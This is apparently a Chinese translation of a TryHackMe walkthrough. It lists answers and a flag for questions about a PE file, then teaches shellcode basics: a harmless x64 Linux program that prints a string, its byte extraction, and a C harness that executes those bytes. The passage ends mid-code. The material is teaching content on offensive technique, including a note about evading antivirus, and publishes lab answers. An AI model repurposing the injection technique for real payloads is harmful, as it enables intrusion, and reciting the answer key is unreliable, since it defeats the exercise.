<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>回答以下问题</div><div class="admonitionContent_BuS1"><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> thm-intro2PE.exe文件的MD5哈希值的最后6位是什么？ </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">530949</span><br></span></code></pre></div></div></div></div></details><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> thm-intro2PE.exe文件的幻数值是多少（十六进制）？ </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">5A4D</span><br></span></code></pre></div></div></div></div></details><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> thm-intro2PE.exe文件的入口点值是多少？ </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">12E4</span><br></span></code></pre></div></div></div></div></details><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> thm-intro2PE.exe文件有多少个部分？ </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">7</span><br></span></code></pre></div></div></div></div></details><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> 可以使用自定义部分来存储额外数据。 恶意软件开发者使用这种技术创建一个包含其恶意代码的新部分，并劫持程序的流程以跳转并执行新部分的内容。 额外部分的名称是什么？ </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">.flag</span><br></span></code></pre></div></div></div></div></details><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> 检查额外部分的内容。 标志是什么？ </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">THM{PE-N3w-s3ction!}</span><br></span></code></pre></div></div></div></div></details></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="任务4-shellcode简介">任务4 Shellcode简介<a href="#任务4-shellcode简介" class="hash-link" aria-label="任务4 Shellcode简介的直接链接" title="任务4 Shellcode简介的直接链接" translate="no">​</a></h2>
<p>Shellcode是一组精心设计的机器代码指令，告诉易受攻击的程序运行附加功能，并且在大多数情况下，提供对系统shell的访问或创建反向命令shell。</p>
<p>一旦shellcode被注入到进程中并由易受攻击的软件或程序执行，它会修改代码运行流程以更新程序的寄存器和功能来执行攻击者的代码。</p>
<p>它通常用汇编语言编写，并翻译成十六进制操作码。 编写独特和自定义的shellcode有助于显著规避AV软件。 但编写自定义shellcode需要处理汇编语言的优秀知识和技能，这不是一项容易的任务！</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="一个简单的shellcode">一个简单的Shellcode<a href="#一个简单的shellcode" class="hash-link" aria-label="一个简单的Shellcode的直接链接" title="一个简单的Shellcode的直接链接" translate="no">​</a></h3>
<p>为了制作你自己的shellcode，需要一套技能：</p>
<ul>
<li class="">对x86和x64 CPU架构的适当理解。</li>
<li class="">汇编语言。</li>
<li class="">对编程语言（如C）的扎实知识。</li>
<li class="">熟悉Linux和Windows操作系统。</li>
</ul>
<p>为了生成我们自己的shellcode，我们需要从汇编器机器代码中编写和提取字节。 对于这个任务，我们将使用AttackBox为Linux创建一个简单的shellcode，写入字符串&quot;THM, Rocks!&quot;。 以下汇编代码使用两个主要函数：</p>
<ul>
<li class="">系统写入函数（sys_write）来打印我们选择的字符串。</li>
<li class="">系统退出函数（sys_exit）来终止程序的执行。</li>
</ul>
<p>为了调用这些函数，我们将使用<strong>系统调用</strong>。 系统调用是程序请求内核执行某些操作的方式。 在这种情况下，我们将请求内核将字符串写入我们的屏幕，然后退出程序。 每个操作系统关于系统调用都有不同的调用约定，这意味着要在Linux中使用写入，您可能使用与在Windows上使用的不同的系统调用。 对于64位Linux，您可以通过设置以下值从内核调用所需的函数：</p>
<table><thead><tr><th style="text-align:left">rax</th><th style="text-align:left">System Call</th><th style="text-align:left">rdi</th><th style="text-align:left">rsi</th><th style="text-align:left">rdx</th></tr></thead><tbody><tr><td style="text-align:left">0x1</td><td style="text-align:left">sys_write</td><td style="text-align:left">unsigned int fd</td><td style="text-align:left">const char *buf</td><td style="text-align:left">size_t count</td></tr><tr><td style="text-align:left">0x3c</td><td style="text-align:left">sys_exit</td><td style="text-align:left">int error_code</td><td style="text-align:left"></td><td style="text-align:left"></td></tr></tbody></table>
<p>上表告诉我们需要在不同的处理器寄存器中设置哪些值，以使用系统调用调用sys_write和sys_exit函数。 对于64位Linux，rax寄存器用于指示我们希望在内核中调用的函数。 将rax设置为0x1使内核执行sys_write，将rax设置为0x3c将使内核执行sys_exit。 这两个函数中的每一个都需要一些参数才能工作，这些参数可以通过rdi、rsi和rdx寄存器设置。 您可以在此处找到可用的64位Linux系统调用的完整参考。</p>
<p>对于<strong>sys_write</strong>，通过<strong>rdi</strong>发送的第一个参数是要写入的文件描述符。 <strong>rsi</strong>中的第二个参数是指向我们想要打印的字符串的指针，而<strong>rdx</strong>中的第三个参数是要打印的字符串的大小。</p>
<p>对于<strong>sys_exit</strong>，需要将rdi设置为程序的退出代码。 我们将使用代码0，这意味着程序成功退出。</p>
<p>将以下代码复制到您的AttackBox中，保存为名为<strong>thm.asm</strong>的文件：</p>
<div class="language-asm codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-asm codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">global _start</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">section .text</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">_start:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    jmp MESSAGE      ; 1) let&#x27;s jump to MESSAGE</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">GOBACK:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    mov rax, 0x1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    mov rdi, 0x1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    pop rsi          ; 3) we are popping into `rsi`; now we have the</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                     ; address of &quot;THM, Rocks!\r\n&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    mov rdx, 0xd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    syscall</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    mov rax, 0x3c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    mov rdi, 0x0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    syscall</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">MESSAGE:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    call GOBACK       ; 2) we are going back, since we used `call`, that means</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                      ; the return address, which is, in this case, the address</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                      ; of &quot;THM, Rocks!\r\n&quot;, is pushed into the stack.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    db &quot;THM, Rocks!&quot;, 0dh, 0ah</span><br></span></code></pre></div></div>
<p>让我们再解释一下ASM代码。 首先，我们的消息字符串存储在.text节的末尾。 由于我们需要一个指向该消息的指针来打印它，我们将在消息本身之前跳转到call指令。 当执行<strong>call GOBACK</strong>时，call之后的下一条指令的地址将被压入堆栈，这对应于我们消息的位置。 请注意，消息末尾的0dh、0ah是换行符（\r\n）的二进制等效形式。</p>
<p>接下来，程序启动GOBACK例程，并为我们的第一个sys_write()函数准备所需的寄存器。</p>
<ul>
<li class="">我们通过在rax寄存器中存储1来指定sys_write函数。</li>
<li class="">我们将rdi设置为1，以便将字符串打印到用户控制台（STDOUT）。</li>
<li class="">我们弹出一个指向我们字符串的指针，该指针在我们调用GOBACK时被压入，并将其存储到rsi中。</li>
<li class="">通过syscall指令，我们使用我们准备的值执行sys_write函数。</li>
<li class="">对于下一部分，我们执行相同的操作来调用sys_exit函数，因此我们将0x3c设置到rax寄存器中，并调用syscall函数来退出程序。</li>
</ul>
<p>接下来，我们编译并链接ASM代码以创建x64 Linux可执行文件，并最终执行该程序。</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Assembler and link our code</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">user@AttackBox$ nasm </span><span class="token parameter variable" style="color:#36acaa">-f</span><span class="token plain"> elf64 thm.asm</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">user@AttackBox$ ld thm.o </span><span class="token parameter variable" style="color:#36acaa">-o</span><span class="token plain"> thm</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">user@AttackBox$ ./thm</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">THM,Rocks</span><span class="token operator" style="color:#393A34">!</span><br></span></code></pre></div></div>
<p>我们使用<strong>nasm</strong>命令编译asm文件，指定**-f elf64**选项以指示我们正在为64位Linux编译。 请注意，结果我们获得了一个.o文件，其中包含目标代码，需要链接才能成为可工作的可执行文件。 <strong>ld</strong>命令用于链接目标文件并获取最终的可执行文件。 <strong>-o</strong>选项用于指定输出可执行文件的名称。</p>
<p>现在我们有了编译后的ASM程序，让我们使用<strong>objdump</strong>命令通过转储编译后二进制文件的.text节来提取shellcode。</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Dump the .text section</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">user@AttackBox$ objdump </span><span class="token parameter variable" style="color:#36acaa">-d</span><span class="token plain"> thm</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">thm:     </span><span class="token function" style="color:#d73a49">file</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">format</span><span class="token plain"> elf64-x86-64</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Disassembly of section .text:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0000000000400080 </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">_start</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain">:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">400080</span><span class="token plain">:    eb 1e                    jmp    4000a0 </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0000000000400082 </span><span class="token builtin class-name">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">400082</span><span class="token plain">:    b8 01 00 00 00           mov    </span><span class="token variable" style="color:#36acaa">$0x1</span><span class="token plain">,%eax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">400087</span><span class="token plain">:    bf 01 00 00 00           mov    </span><span class="token variable" style="color:#36acaa">$0x1</span><span class="token plain">,%edi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  40008c:    5e                       pop    %rsi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  40008d:    ba 0d 00 00 00           mov    </span><span class="token variable" style="color:#36acaa">$0xd</span><span class="token plain">,%edx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">400092</span><span class="token plain">:    0f 05                    syscall </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">400094</span><span class="token plain">:    b8 3c 00 00 00           mov    </span><span class="token variable" style="color:#36acaa">$0x3c</span><span class="token plain">,%eax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">400099</span><span class="token plain">:    bf 00 00 00 00           mov    </span><span class="token variable" style="color:#36acaa">$0x0</span><span class="token plain">,%edi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  40009e:    0f 05                    syscall </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00000000004000a0 </span><span class="token builtin class-name">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  4000a0:    e8 </span><span class="token function" style="color:#d73a49">dd</span><span class="token plain"> ff ff ff           callq  </span><span class="token number" style="color:#36acaa">400082</span><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  4000a5:    </span><span class="token number" style="color:#36acaa">54</span><span class="token plain">                       push   %rsp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  4000a6:    </span><span class="token number" style="color:#36acaa">48</span><span class="token plain">                       rex.W</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  4000a7:    4d 2c </span><span class="token number" style="color:#36acaa">20</span><span class="token plain">                 rex.WRB sub </span><span class="token variable" style="color:#36acaa">$0x20</span><span class="token plain">,%al</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  4000aa:    </span><span class="token number" style="color:#36acaa">52</span><span class="token plain">                       push   %rdx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  4000ab:    6f                       outsl  %ds:</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">%rsi</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">,</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">%dx</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  4000ac:    </span><span class="token number" style="color:#36acaa">63</span><span class="token plain"> 6b </span><span class="token number" style="color:#36acaa">73</span><span class="token plain">                 movslq 0x73</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">%rbx</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">,%ebp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  4000af:    </span><span class="token number" style="color:#36acaa">21</span><span class="token plain">                       .byte 0x21</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  4000b0:    0d                       .byte 0xd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  4000b1:    0a                       .byte 0xa</span><br></span></code></pre></div></div>
<p>现在我们需要从上述输出中提取十六进制值。 为此，我们可以使用<strong>objcopy</strong>将**.text<strong>节转储到一个名为</strong>thm.text**的新文件中，格式为二进制，如下所示：</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">user@AttackBox$ objcopy </span><span class="token parameter variable" style="color:#36acaa">-j</span><span class="token plain"> .text </span><span class="token parameter variable" style="color:#36acaa">-O</span><span class="token plain"> binary thm thm.text</span><br></span></code></pre></div></div>
<p>thm.text包含我们的shellcode，格式为二进制，因此为了能够使用它，我们需要先将其转换为十六进制。 <strong>xxd</strong>命令具有**-i**选项，可以直接以C字符串形式输出二进制文件：</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Output the hex equivalent to our shellcode</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">user@AttackBox$ xxd </span><span class="token parameter variable" style="color:#36acaa">-i</span><span class="token plain"> thm.text</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">unsigned char new_text</span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  0xeb, 0x1e, 0xb8, 0x01, 0x00, 0x00, 0x00, 0xbf, 0x01, 0x00, 0x00, 0x00,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  0x5e, 0xba, 0x0d, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xb8, 0x3c, 0x00, 0x00,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  0x00, 0xbf, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xe8, 0xdd, 0xff, 0xff,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  0xff, 0x54, 0x48, 0x4d, 0x2c, 0x20, 0x52, 0x6f, 0x63, 0x6b, 0x73, 0x21,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  0x0d, 0x0a</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">unsigned int new_text_len </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">50</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<p>最后，我们得到了它，一个来自我们ASM汇编的格式化shellcode。 这很有趣！ 正如我们所看到的，为你的工作生成shellcode需要奉献精神和技能！</p>
<p>为了确认提取的shellcode按我们预期的方式工作，我们可以执行我们的shellcode并将其注入到C程序中。</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">include</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property string" style="color:#e3116c">&lt;stdio.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">main</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> argc</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token plain">argv</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">unsigned</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> message</span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token number" style="color:#36acaa">0xeb</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x1e</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xb8</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x01</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xbf</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x01</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token number" style="color:#36acaa">0x5e</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xba</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x0d</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x0f</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x05</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xb8</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x3c</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xbf</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x0f</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x05</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xe8</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xdd</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xff</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xff</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token number" style="color:#36acaa">0xff</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x54</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x48</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x4d</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x2c</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x20</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x52</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x6f</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x63</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x6b</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x73</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x21</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token number" style="color:#36acaa">0x0d</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x0a</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">void</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">message</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token 